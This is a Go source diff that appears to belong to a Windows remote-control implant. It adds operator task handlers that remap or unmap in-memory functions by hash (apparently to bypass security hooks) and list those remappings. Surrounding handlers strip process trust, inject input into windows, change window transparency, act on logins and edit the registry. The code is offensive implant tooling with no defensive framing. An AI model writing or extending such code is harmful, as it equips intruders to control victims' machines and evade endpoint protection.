@@ -112,7 +112,7 @@ func taskTroll(x context.Context, r data.Reader, _ data.Writer) error {
 		z.Stop()
 		return winapi.SetWindowTransparency(0, 255)
 	}
-	return xerr.Sub("invalid operation", 0x68)
+	return errInvalidOp
 }
 func taskCheck(_ context.Context, r data.Reader, w data.Writer) error {
 	var (
@@ -267,6 +267,30 @@ func taskUntrust(_ context.Context, r data.Reader, _ data.Writer) error {
 		return err
 	}
 	return winapi.Untrust(p)
+}
+func taskFuncMap(_ context.Context, r data.Reader, _ data.Writer) error {
+	v, err := r.Uint8()
+	if err != nil {
+		return err
+	}
+	if v == taskFuncMapUnmapAll {
+		return winapi.FuncUnmapAll()
+	}
+	h, err := r.Uint32()
+	if err != nil {
+		return err
+	}
+	switch v {
+	case taskFuncMapMap:
+		b, err := r.Bytes()
+		if err != nil {
+			return err
+		}
+		return winapi.FuncRemapHash(h, b)
+	case taskFuncMapUnmap:
+		return winapi.FuncUnmapHash(h)
+	}
+	return errInvalidOp
 }
 func taskRegistry(_ context.Context, r data.Reader, w data.Writer) error {
 	var (
@@ -449,7 +473,7 @@ func taskInteract(_ context.Context, r data.Reader, w data.Writer) error {
 		}
 		return winapi.SendInput(uintptr(h), t)
 	}
-	return xerr.Sub("invalid operation", 0x68)
+	return errInvalidOp
 }
 func taskShutdown(_ context.Context, r data.Reader, _ data.Writer) error {
 	m, err := r.StringVal()
@@ -513,7 +537,7 @@ func taskLoginsAct(_ context.Context, r data.Reader, w data.Writer) error {
 		w.WriteUint32(o)
 		return nil
 	}
-	return xerr.Sub("invalid operation", 0x68)
+	return errInvalidOp
 }
 func taskLoginsProc(_ context.Context, r data.Reader, w data.Writer) error {
 	s, err := r.Int32()
@@ -543,6 +567,25 @@ func taskWindowList(_ context.Context, _ data.Reader, w data.Writer) error {
 		return err
 	}
 	if err = w.WriteUint32(uint32(len(e))); err != nil {
+		return err
+	}
+	if len(e) == 0 {
+		return nil
+	}
+	for i, m := uint32(0), uint32(len(e)); i < m; i++ {
+		if err = e[i].MarshalStream(w); err != nil {
+			return err
+		}
+	}
+	return nil
+}
+
+func taskFuncMapList(_ context.Context, _ data.Reader, w data.Writer) error {
+	var (
+		e   = winapi.FuncRemapList()
+		err = w.WriteUint32(uint32(len(e)))
+	)
+	if err != nil {
 		return err
 	}
 	if len(e) == 0 {
